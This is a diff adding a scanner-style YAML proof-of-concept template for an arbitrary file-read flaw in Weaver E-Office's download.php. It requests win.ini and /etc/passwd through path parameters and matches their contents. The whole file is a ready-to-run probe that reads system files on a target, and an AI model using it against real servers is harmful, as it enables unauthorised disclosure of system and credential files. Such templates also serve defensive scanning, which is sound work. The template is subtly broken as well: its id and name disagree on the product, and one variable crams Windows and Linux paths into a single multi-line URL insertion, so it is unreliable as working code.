@@ -1,0 +1,31 @@
+id: poc-yaml-weaver-e-cology-download-fileread
+info:
+  name: 泛微E-Office download.php 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+
+variables:
+  r_data_linux: |
+    ?filename=win.ini&dir=C:\\Windows\\
+    ?filename=passwd&dir=/etc/
+
+http:
+  - raw:
+      - |
+        GET /general/file_folder/file_new/neworedit/download.php{{r_data_linux}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+        part: body
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
